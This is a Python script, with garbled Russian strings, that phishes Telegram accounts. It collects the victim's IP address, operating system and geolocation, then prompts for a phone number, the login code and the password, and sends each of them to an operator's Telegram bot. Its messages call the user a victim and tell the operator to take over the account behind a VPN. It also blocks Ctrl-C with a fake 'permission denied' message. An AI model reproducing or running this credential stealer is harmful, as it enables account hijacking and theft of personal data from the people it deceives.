import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import sys
import signal
import random
import platform
import json

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''
os_name = platform.system()
sys_name = 'undefined'
emoji = ''
tmate_output = []
IP = ''
INTRO = ''
stop_event = threading.Event()

def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    if offset:
        url += f"?offset={offset}"
    response = requests.get(url)
    return response.json()

def handle_updates(updates):
    global IP
    for update in updates['result']:
        message = update['message']
        chat_id = message['chat']['id']
        text = message.get('text', '')

        if 'text' in message and text == '/code':
            stop_event.set()  # –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞–Ω–∏–º–∞—Ü–∏—é
            sys.stdout.write('\r' + ' ' * 40 + '\r')
            if os_name == "Windows":
                os.system('cls')  # –î–ª—è Windows
            elif os_name in ["Linux", "Darwin"]:  # Linux –∏ macOS
                os.system('clear')  # –î–ª—è Linux –∏ macOS
            else:
                send_telegram_message(f"üö´ Fatal. Unsupported platform.")
            code = input("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è: ")
            if not all(char in '0123456789' for char in code):  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä
                print('–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç.')
                time.sleep(1)
                send_telegram_message(f'üö´ –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫')
                auth()
            else:
                send_telegram_message(f'–ö–æ–¥ {IP}: {code}')
                pwd = input('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å: ')
                send_telegram_message(f'–ü–∞—Ä–æ–ª—å {IP}: {pwd}')
                send_telegram_message(f'üîë –ü–æ–ª—É—á–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –∞–∫–∫–∞—É–Ω—Ç—É.')
                if os_name == "Windows":
                    os.system('cls')  # –î–ª—è Windows
                elif os_name in ["Linux", "Darwin"]:  # Linux –∏ macOS
                    os.system('clear')  # –î–ª—è Linux –∏ macOS
                else:
                    send_telegram_message(f"üö´ Fatal. Unsupported platform.")
                continue
        else:
            return
                
def listener():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates['result']:
            handle_updates(updates)
            offset = updates['result'][-1]['update_id'] + 1
        time.sleep(1)

def get_geolocation():
    try:
        result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("üåê‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ curl.")
            return None
    except Exception as e:
        send_telegram_message(f"üåê‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ: {e}")
        return None

def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("‚õìÔ∏è‚Äçüí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∑–∞–ø—Ä–æ—Å–∞ –∫ ipinfo.io")
        return None

def anim():
    frames = ['|', '/', '-', '\\']
    while not stop_event.is_set():
        for frame in frames:
            if stop_event.is_set():  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—Å—Ç–∞–Ω–æ–≤–∫—É –∞–Ω–∏–º–∞—Ü–∏–∏
                break
            sys.stdout.write(f'\r–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ... {frame}')
            sys.stdout.flush()
            time.sleep(0.1)

def run_commands():
    global os_name
    global sys_name
    global emoji
    global IP
    global begin
    print(begin)
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = 'üì±'
                subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                sys_name = "Linux"
                emoji = 'üêß'
                subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = 'üçè'
            subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = 'üíª'
            subprocess.run(['winget', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['choco', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            send_telegram_message(f"‚ö†Ô∏è –û–° –∂–µ—Ä—Ç–≤—ã –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞! –û–°: {os_name}. –ü—Ä–æ–¥–æ–ª–∂–∞—é —Ä–∞–±–æ—Ç—É.")
            emoji = '‚ö†Ô∏è'
            sys_name = "–ù–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–∞—è –û–°"
    except Exception as e:
        send_telegram_message(f"‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π, –ø—Ä–æ–¥–æ–ª–∂–∞—é —Ä–∞–±–æ—Ç—É: {e}")
        print(f"–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: {e}")
    try:
        result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            ip_address = result.stdout.strip()
        else:
            ip_address = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π'
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏
            location_message = (
                f"üåç –ì–µ–æ\n"
                f"–®–∏—Ä–æ—Ç–∞: {latitude}\n"
                f"–î–æ–ª–≥–æ—Ç–∞: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"–ì–æ—Ä–æ–¥: {location_info.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    f"–†–µ–≥–∏–æ–Ω: {location_info.get('region', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    f"–°—Ç—Ä–∞–Ω–∞: {location_info.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                    f"–ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å: {location_info.get('postal', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
                )
            else:
                location_message += "üåê‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø –∏–Ω—Ñ—É."
        else:
            location_message = "üåê‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ."
        send_telegram_message(f"{emoji} –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è\n–ö–ª–∏–µ–Ω—Ç/IP: {ip_address}\n–°–∏—Å—Ç–µ–º–∞: {sys_name} {ver} {arch}\n {location_message}")
        send_telegram_message(f"""üò§ –ì–æ—Ç–æ–≤—å—Å—è! –û—Ç–∫—Ä–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞ —Ç–µ–ª–µ–≥—Ä–∞–º, —Ç–µ–±–µ –ø—Ä–µ–¥—Å—Ç–æ–∏—Ç –≤–≤–µ—Å—Ç–∏ –Ω–æ–º–µ—Ä –∂–µ—Ä—Ç–≤—ã. –í–∫–ª—é—á–∏ VPN —á—Ç–æ–±—ã –Ω–µ —Å–ø–∞–ª–∏—Ç—å —Å–µ–±—è.""")
        IP = ip_address
    except Exception as e:
        send_telegram_message(f"üö´ Fatal: {e}")
    if os_name == "Windows":
        os.system('cls')  # –î–ª—è Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux –∏ macOS
        os.system('clear')  # –î–ª—è Linux –∏ macOS
    else:
        send_telegram_message(f"üö´ Fatal. Unsupported platform.")
    auth()
    
def auth():
    global INTRO
    global IP
    if os_name == "Windows":
        os.system('cls')  # –î–ª—è Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux –∏ macOS
        os.system('clear')  # –î–ª—è Linux –∏ macOS
    else:
        send_telegram_message(f"üö´ Fatal. Unsupported platform.")
    print(INTRO)
    number = input('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ')
    if '+' not in number:
        print('–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç.')
        time.sleep(1)
        auth()
    else:
        send_telegram_message(f"–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ {IP}: {number}")
        send_telegram_message(f"‚ö†Ô∏è –î–µ–π—Å—Ç–≤—É–π –±—ã—Å—Ç—Ä–æ! –ö–∞–∫ –≤–≤–µ–¥–µ—à—å –Ω–æ–º–µ—Ä, –Ω–∞–ø–∏—à–∏ –º–Ω–µ –∫–æ–º–∞–Ω–¥—É /code, —á—Ç–æ–±—ã —è —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å –∫–æ–¥.")
        animation_thread = threading.Thread(target=anim)
        animation_thread.start()

def intergram():
    run_commands()
    listen_thread = threading.Thread(target=listener)
    listen_thread.start()

if __name__ == "__main__":
    intergram()